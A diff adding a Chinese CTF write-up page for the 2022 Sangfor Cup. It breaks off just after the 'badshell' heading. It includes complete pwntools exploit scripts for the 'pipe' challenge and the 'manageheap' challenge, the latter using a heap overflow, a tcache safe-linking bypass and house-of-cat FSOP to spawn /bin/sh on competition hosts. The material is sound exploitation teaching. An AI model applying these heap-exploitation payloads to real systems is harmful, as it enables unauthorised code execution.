@@ -156,6 +156,141 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/" class="post-title-link" itemprop="url">深信服杯CTF2022</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-15 18:31:48 / Modified: 18:33:12" itemprop="dateCreated datePublished" datetime="2022-11-15T18:31:48+08:00">2022-11-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>8.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>8 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipe: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d5d6c196bf2c85c2c624a610ec541382acc30bb0, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，全开</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">  close(fd);</span><br><span class="line">  system(<span class="string">&quot;./ctf.sh&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>往 <code>&quot;./ctf.sh&quot;</code> 中写 <code>cat flag</code> 就可以了</li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>可以先把 <code>cat flag</code> 写入管道，然后把 <code>pipe_buffer</code> 中的数据写入 <code>&quot;./ctf.sh&quot;</code></p>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipe&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;45715&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x16D7)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;cmd&gt;&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_pipe</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_pipe</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;read size&gt;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input&gt;&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_file</span>(<span class="params">path</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">path,size</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**size?&gt;&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;file path&gt;&quot;</span>,<span class="string">&quot;./ctf.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cat flag\n&quot;</span></span><br><span class="line">write_to_pipe(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">write()</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="manageheap"><a href="#manageheap" class="headerlink" title="manageheap"></a>manageheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.\n</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">manageheap: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.35</span><span class="number">-0u</span>buntu3_amd64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b988b53575c5a8324331c1b492940f6098e71ace, stripped<span class="number">&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，全开</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num = LODWORD(chunk_list[index]-&gt;num);</span><br><span class="line"><span class="keyword">if</span> ( i &gt; num )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], id) )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;change done.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当 <code>i==num</code> 时，有8字节的溢出</li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>先利用8字节的溢出来修改 chunk-&gt;size，释放后获得 unsorted chunk，接下来执行一次申请操作，泄露出遗留在 chunk 中的 main_arena 和 tcache-&gt;next</p>
+<p>然后打 tcache attack，把 <code>IO_list_all</code> 写入 tcachebin 中，这里有两个注意点：</p>
+<ul>
+<li>libc-2.34 及其以上版本会设置 key 值，利用如下公式就可以绕过：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">target = IO_list_all^key</span><br></pre></td></tr></table></figure>
+<ul>
+<li>劫持目标 tcachebin 之前，需要先看看 tcache head-&gt;count 的值够不够申请到 <code>IO_list_all</code>（当对应 count 为“0”时，程序将不会申请该 tcachebin 上的 free chunk），比赛时就考虑漏了这个问题，导致 <code>IO_list_all</code> 申请不出来，浪费了很长的时间</li>
+</ul>
+<p>在高版本 libc 中，最终劫持控制流的手段就那么几种，比赛时我使用了 house of cat</p>
+<p>接下来就是标准的 house of cat 了，IO 流可以如下代码进行触发：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !read(<span class="number">0</span>, chunk_list[i]-&gt;chunk_data, <span class="number">8</span> * LODWORD(chunk_list[i]-&gt;num)) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当输入的 <code>chunk_list[i]-&gt;num</code> 为“0”时，<code>read</code> 就会执行失败</li>
+<li>然后调用 <code>exit</code> 触发 house of cat</li>
+</ul>
+<p>由于本题目没有沙盒，我的第一反应是直接写 <code>one_gadget</code>，后来打远程时环境不对，只能用 <code>system(&quot;/bin/sh&quot;)</code></p>
+<p>当时不知道怎么控制程序的参数，幸好 house of cat 触发后直接执行了 <code>system(&quot;aaaaaaaa&quot;)</code>，于是我把所有的 <code>&quot;aaaaaaaa&quot;</code> 替换为 <code>&quot;/bin/sh&quot;</code> 然后就 getshell 了</p>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./manageheap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x1868)\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge,cmd)</span></span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;58012&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice: &quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">number,name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(number))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt; \n&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your id:&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">p.send(p64(<span class="number">0x621</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x3f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Member: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">libc_puts = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">success(<span class="string">&quot;_IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">main_arena1 = libc_base + <span class="number">0x219c0a</span></span><br><span class="line">main_arena2 = libc_base + <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;main_arena1 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena1))</span><br><span class="line">success(<span class="string">&quot;main_arena2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena2))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x0000000000090529</span></span><br><span class="line"></span><br><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&quot;IO_list_all^key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x50a37</span>,<span class="number">0xebcf1</span>,<span class="number">0xebcf5</span>,<span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">0</span>] + libc_base</span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;libc_system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line">target_chunk = heap_base + <span class="number">0x340</span></span><br><span class="line">target = target_chunk ^ key</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(target))</span><br><span class="line">p.sendline(p64(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x430</span> </span><br><span class="line">payload_addr = heap_base</span><br><span class="line">flag_addr = heap_base</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(libc_system)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;cccccccc&quot;</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccccccc&quot;</span>,<span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccc&quot;</span>,p64(fake_io_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,<span class="string">&quot;win&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>PS：菜鸡 pwn 手的第一个3血</p>
+<h2 id="badshell"><a href="#badshell" class="headerlink" title="badshell"></a>badshell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
